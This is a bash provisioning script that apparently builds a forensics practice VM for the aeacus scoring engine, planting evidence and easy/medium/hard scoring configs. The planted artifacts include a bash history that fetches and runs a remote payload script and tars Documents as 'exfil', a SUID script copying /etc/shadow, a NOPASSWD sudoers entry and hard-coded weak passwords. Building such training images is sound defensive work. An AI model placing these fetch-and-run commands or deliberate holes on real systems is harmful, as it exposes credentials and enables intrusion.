#!/usr/bin/env bash
set -euo pipefail
export DEBIAN_FRONTEND=noninteractive

echo "Starting provisioning..."

# Basic tools and build toolchain
apt-get update -y
apt-get install -y curl wget git unzip python3 python3-pip net-tools rsyslog sudo vim cron sqlite3 golang-go build-essential openssh-server

# Create workspace for aeacus
mkdir -p /opt/aeacus
chown vagrant:vagrant /opt/aeacus || true
cd /opt/aeacus

# Clone repo (will attempt; if network blocked, fallback to shim)
if [ ! -d /opt/aeacus/aeacus-src ]; then
  git clone https://github.com/elysium-suite/aeacus aeacus-src || true
fi
cd aeacus-src || true

# Try to build with Go (if source exists)
if [ -f ./go.mod ] || [ -d ./cmd/aeacus ]; then
  echo "Attempting to build aeacus with Go..."
  if command -v go >/dev/null 2>&1; then
    /usr/bin/env go build -o /opt/aeacus/aeacus ./cmd/aeacus || true
  fi
fi

# If no binary, create a shim with richer features (so test automation can run)
if [ ! -x /opt/aeacus/aeacus ]; then
  cat > /opt/aeacus/aeacus <<'EOF'
#!/usr/bin/env bash
# Rich shim: accepts commands check, score, forensics, and outputs structured JSON for tests
cmd="$1"; shift || true
case "$cmd" in
  --verbose) echo "aeacus shim: verbose $*"; shift; cmd="$1"; shift || true;;
esac
case "$cmd" in
  check)
    echo '{"status":"ok","checks":["scoring.conf present","TeamID present"]}'
    ;;
  score)
    echo '{"status":"scored","results":{"check1":true,"check2":true}}'
    ;;
  forensics)
    n=${1:-1}
    mkdir -p /home/vagrant/Desktop
    for i in $(seq 1 $n); do
      fq="/home/vagrant/Desktop/ForensicsQ${i}.txt"
      echo "Forensic Question #${i}" > "${fq}"
      echo "Hint: look in /home/student1 for evidence" >> "${fq}"
      chown vagrant:vagrant "${fq}"
    done
    echo "{"created":$n}"
    ;;
  *)
    echo "aeacus shim: unknown command $cmd"
    ;;
esac
EOF
  chmod +x /opt/aeacus/aeacus
fi

# TeamID and default configs
echo "TESTTEAM-001" > /opt/aeacus/TeamID.txt
chown vagrant:vagrant /opt/aeacus/TeamID.txt || true

# Copy scoring and ReadMe.conf if provided via /vagrant (synced folder)
if [ -f /vagrant/scoring.conf ]; then cp /vagrant/scoring.conf /opt/aeacus/scoring.conf || true; fi
if [ -f /vagrant/ReadMe.conf ]; then cp /vagrant/ReadMe.conf /opt/aeacus/ReadMe.conf || true; fi

# Create users and artifacts
if ! id -u student1 >/dev/null 2>&1; then useradd -m -s /bin/bash student1 || true; echo "student1:Password123!" | chpasswd; fi
if ! id -u badactor >/dev/null 2>&1; then useradd -m -s /bin/bash badactor || true; echo "badactor:SecretP@ssw0rd" | chpasswd; fi

# SSH keys for badactor
mkdir -p /home/badactor/.ssh
if [ ! -f /home/badactor/.ssh/id_rsa ]; then ssh-keygen -t rsa -f /home/badactor/.ssh/id_rsa -N "" -q || true; fi
chown -R badactor:badactor /home/badactor/.ssh || true; chmod 700 /home/badactor/.ssh || true; chmod 600 /home/badactor/.ssh/id_rsa || true

# Bash history with suspicious commands for student1
cat <<'BASHH' > /home/student1/.bash_history
cd /var/www/html
sudo tar -czf /tmp/exfil.tar.gz /home/student1/Documents
echo "backup done"
wget http://example.com/payload.sh -O /tmp/payload.sh
bash /tmp/payload.sh
rm -f /tmp/payload.sh
BASHH
chown student1:student1 /home/student1/.bash_history; chmod 600 /home/student1/.bash_history

# Hidden exfil directory and files
mkdir -p /home/student1/Documents/research /home/student1/.cache/.thumbs
echo "SSN 123-45-6789" > /home/student1/Documents/research/financials.txt
echo "secret-flag{practice-flag}" > /home/student1/secret_flag.txt
echo "sensitive_photo.jpg" > /home/student1/.cache/.thumbs/README.txt
chown -R student1:student1 /home/student1

# Create a small webserver artifact (simple index and access log)
mkdir -p /var/www/html
cat > /var/www/html/index.html <<'HTML'
<html><body><h1>Practice Webserver</h1></body></html>
HTML
# Simulated access log with wget user agent and payload fetch
mkdir -p /var/log/practiceweb
cat > /var/log/practiceweb/access.log <<'LOG'
192.0.2.1 - - [02/Oct/2025:10:00:00 -0700] "GET /payload.sh HTTP/1.1" 200 230 "-" "Wget/1.20.3"
LOG

# Create a "deleted" file scenario: create file and delete it (simulate evidence in file system)
echo "Deleted secret content: token=ABC123" > /tmp/deleteme.txt
rm -f /tmp/deleteme.txt || true

# Create a timestomped file (change mtime/atime)
echo "Old notes" > /home/student1/Documents/notes.txt
touch -amt 202001010000 /home/student1/Documents/notes.txt

# Create rotated syslog and tampered copy
echo "Normal syslog entry" >> /var/log/syslog
cp /var/log/syslog /var/log/syslog.1 || true
# Overwrite a rotated log to simulate tampering
echo "Tampered: payload downloaded" > /var/log/syslog.1 || true

# Add a suspicious cron job
cat > /etc/cron.d/malcron <<'CRON'
*/5 * * * * badactor /usr/bin/env bash -c '/bin/echo hello > /tmp/cronjob_run.log'
CRON
chmod 644 /etc/cron.d/malcron

# Add sudoers misconfiguration (NOPASSWD)
echo "badactor ALL=(ALL) NOPASSWD: /usr/bin/apt" > /etc/sudoers.d/99_badactor
chmod 440 /etc/sudoers.d/99_badactor || true

# Add a SUID bit binary (intentional)
cat > /usr/local/bin/suid_example <<'BINS'
#!/bin/bash
/bin/cp /etc/shadow /tmp/shadow.copy
echo "copied"
BINS
chmod 4755 /usr/local/bin/suid_example

# Create browser-like artifacts: a simple sqlite places DB to mimic Firefox history
mkdir -p /home/student1/.mozilla/fakeprofile
sqlite3 /home/student1/.mozilla/fakeprofile/places.sqlite "CREATE TABLE moz_places(id INTEGER PRIMARY KEY, url TEXT, title TEXT, visit_count INTEGER); INSERT INTO moz_places(url,title,visit_count) VALUES('http://example.com/payload.sh','payload','3');"
chown -R student1:student1 /home/student1/.mozilla || true

# Create difficulty-level scoring configs for aeacus
cat > /opt/aeacus/scoring_easy.conf <<'SC'
[scoring]
check1 = /home/student1/secret_flag.txt
check2 = /home/student1/.bash_history
SC

cat > /opt/aeacus/scoring_medium.conf <<'SC'
[scoring]
check1 = /home/student1/secret_flag.txt
check2 = /home/student1/.bash_history
check3 = /usr/local/bin/suid_example
check4 = /etc/sudoers.d/99_badactor
SC

cat > /opt/aeacus/scoring_hard.conf <<'SC'
[scoring]
check1 = /home/student1/secret_flag.txt
check2 = /home/student1/.bash_history
check3 = /usr/local/bin/suid_example
check4 = /etc/sudoers.d/99_badactor
check5 = /var/log/practiceweb/access.log
check6 = /home/student1/.mozilla/fakeprofile/places.sqlite
SC

# ReadMe templates
cat > /opt/aeacus/ReadMe_easy.conf <<'RM'
This EASY image includes obvious artifacts:
- secret_flag.txt in /home/student1
- suspicious bash history in /home/student1/.bash_history
Use 'aeacus forensics 1' to generate a question.
RM

cat > /opt/aeacus/ReadMe_medium.conf <<'RM'
This MEDIUM image hides additional artifacts:
- SUID binary at /usr/local/bin/suid_example
- NOPASSWD sudoers entry for badactor
- cron job /etc/cron.d/malcron
RM

cat > /opt/aeacus/ReadMe_hard.conf <<'RM'
This HARD image includes subtler artifacts:
- Webserver access log showing payload fetch (/var/log/practiceweb/access.log)
- Browser history sqlite at /home/student1/.mozilla/fakeprofile/places.sqlite
- Tampered rotated syslog (/var/log/syslog.1)
RM

chown -R vagrant:vagrant /opt/aeacus || true

# Place a simple test script to automate aeacus runs and validate expected artifacts
cat > /home/vagrant/test_run.sh <<'TEST'
#!/usr/bin/env bash
set -euo pipefail
echo "Running automated aeacus checks..."
AE=/opt/aeacus/aeacus
# Check presence
echo "Checking TeamID and configs..."
[ -f /opt/aeacus/TeamID.txt ] || (echo "MISSING TeamID" && exit 2)
# Run shim/aeacus check and score
$AE --verbose check || (echo "aeacus check failed" && exit 3)
$AE --verbose score || (echo "aeacus score failed" && exit 4)
# Generate 2 forensic questions
$AE forensics 2 || (echo "aeacus forensics failed" && exit 5)
# Validate created files
[ -f /home/vagrant/Desktop/ForensicsQ1.txt ] && [ -f /home/vagrant/Desktop/ForensicsQ2.txt ] || (echo "Missing ForensicsQ files" && exit 6)
echo "Automated test passed."
TEST
chmod +x /home/vagrant/test_run.sh
chown vagrant:vagrant /home/vagrant/test_run.sh || true

# Start a tiny python webserver to serve /var/www/html on port 8000 in background (for optional use)
nohup python3 -m http.server --directory /var/www/html 8000 >/dev/null 2>&1 &

# Restart services to flush logs and cron
systemctl restart cron || true
systemctl restart rsyslog || true

echo "Provisioning complete. Enhanced artifacts created."
